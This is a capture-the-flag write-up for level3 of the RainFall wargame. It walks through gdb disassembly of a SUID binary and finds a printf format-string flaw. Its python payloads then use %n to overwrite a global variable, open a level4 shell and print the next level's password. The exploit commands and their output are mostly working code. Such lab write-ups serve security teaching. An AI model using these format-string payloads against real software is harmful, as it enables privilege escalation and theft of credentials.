Login as `level3`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.1.28 -p 4242 -l level3
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on :4242
level3@192.168.1.28's password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level31
```
A `SUID` executable is located in the home directory.
```shell
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```
Print all defined functions.
```gdb
(gdb) info functions
[...]
0x080484a4  v
0x0804851a  main
```
`v()` function has a conditional call to `system()` on line `111` with `/bin/sh` as a parameter. Some value stored in `0x804988c` must to be equal to 0x40.
```gdb
(gdb) disassemble v
Dump of assembler code for function v:
   [...]
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   [...]
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   [...]
End of assembler dump.
(gdb) x 0x804860d
0x804860d:	 "/bin/sh"
```
A bit earlier, `printf()` is called with  without format string. It cause [FSA](https://owasp.org/www-community/attacks/Format_string_attack) aka [UFS](https://en.wikipedia.org/wiki/Uncontrolled_format_string) vulnerability.
```gdb
(gdb) disassemble v
Dump of assembler code for function v:
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```
Man page of `printf` has a SECURITY CONSIDERATIONS section which says that _%n can be used to write arbitrary data to selected addresses_.

BSS section contains a variable `m` which is declared but have not been assigned a value.
This variable is used while comparing it to 64 in `if` condition.
```gdb
level3@RainFall:~$ objdump -t ./level3
[...]
0804988c g     O .bss	00000004              m
[...]
```
Using `%x` format tokens allows to print data/addresses from the call stack.
```shell
level3@RainFall:~$ ./level3
%08x %08x %08x %08x
00000200 b7fd1ac0 b7ff37d0 78383025
```
An offset at which the `argv` start should be find.
```shell
level3@RainFall:~$ for i in {0..100}; do echo "Offset: $i"; python -c "print 'AAAA' + '%08x '*$i" | ./level3; read; done
Offset: 0
AAAA

Offset: 1
AAAA00000200

Offset: 2
AAAA00000200 b7fd1ac0

Offset: 3
AAAA00000200 b7fd1ac0 b7ff37d0

Offset: 4
AAAA00000200 b7fd1ac0 b7ff37d0 41414141

Offset: 5
AAAA00000200 b7fd1ac0 b7ff37d0 41414141 78383025
```

```shell
level3@RainFall:~$ (python -c "print 'A'*60 + '\x8c\x98\x04\x08%19\$n'"; cat -) | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
64/4=16
Offset between 4 and 19 could be used to write 64 in m
```gdb
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08'*16 + '%4\$n'"; echo "cat /home/user/level4/.pass") | ./level3
�����������������
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
level3@RainFall:~$ for i in {4..19}; do echo $i; (python -c "print '\x8c\x98\x04\x08'*16 + '%$i\$n'"; echo "cat /home/user/level4/.pass") | ./level3; done
```
